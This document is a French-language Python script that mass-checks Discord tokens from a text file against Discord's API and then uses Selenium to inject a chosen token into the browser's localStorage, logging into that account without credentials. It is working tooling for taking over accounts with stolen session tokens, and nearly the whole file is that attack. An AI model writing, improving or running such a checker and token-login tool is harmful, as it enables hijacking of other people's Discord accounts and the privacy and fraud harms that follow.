from selenium import webdriver
import requests
import time
import os


def clear():
    os.system("cls") if os.name == "nt" else os.system("clear")

def Choice1TokenDiscord():
    clear()
    def CheckToken(token_number, token):
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            status = f"Valide"
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f"[{token_number}] -> Status: {status} | User: {username_discord} | Token: {token_sensur}")
        else:
            status = f"Invalide"
            print(f"[{token_number}] -> Status: {status} | Token: {token}")

    file_token_discord = "./TokenList.txt"
    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(f"Les Token Discord ({file_token_discord}):\n")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    if not tokens:
        print(f"Aucun jeton Discord dans le fichier : {file_token_discord}. Veuillez ajouter des jetons au fichier.")

        return None

    try:
        selected_token_number = int(input(f"\nToken Numéro -> "))
    except:
        ErrorChoice()

    selected_token = tokens.get(selected_token_number)
    if selected_token:
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': selected_token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            pass
        else:
            ErrorToken()
    else:
        ErrorChoice()
    return selected_token

def ErrorChoice():
    print(f"Choix Invalide !")
    time.sleep(3)
    

def ErrorToken():
    print(f"Token Invalide !")
    time.sleep(3)
    


    
print()
token = Choice1TokenDiscord()

print(f"""
[01] -> Chrome
[02] -> Firefox
[03] -> Edge
""")
choice = input(f"Navigateur -> ")

try:
    if choice == '1':
        navigator = "Chrome"
        print(f"Démarrage de  de {navigator}..")
        driver = webdriver.Chrome()
        print(f"{navigator} Prêt !")

    elif choice == '2':
        navigator = "Firefox"
        print(f"Démarrage de {navigator}..")
        driver = webdriver.Firefox()
        print(f"{navigator} Prêt !")

    elif choice == '3':
        navigator = "Edge"
        print(f"Démarrage de {navigator}..")
        driver = webdriver.Edge()
        print(f"{navigator} Prêt !")

    else:
        ErrorChoice()
    
    script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
    
    driver.get("https://discord.com/login")
    print(f"Token Connection..")
    driver.execute_script(script + f'\nlogin("{token}")')
    time.sleep(4)
    print(f"Token connecté !")
    print(f"Si vous quittez le TokenLogin, Edge se fermera !")
    input(f"Quitter Edge (appuyez sur Entrée) -> ")

    
except:
    print(f"{navigator} n'est pas installé ou le pilote n'est pas à jour.")

    